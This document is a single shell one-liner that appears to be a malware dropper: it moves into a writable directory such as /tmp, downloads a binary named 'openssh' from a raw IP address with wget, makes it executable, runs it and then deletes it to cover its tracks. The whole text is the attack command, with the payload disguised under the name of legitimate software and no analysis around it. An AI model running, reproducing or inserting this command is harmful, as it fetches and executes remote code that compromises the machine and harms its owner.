cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.236.227.147/openssh; chmod +x openssh; ./openssh; rm -rf openssh
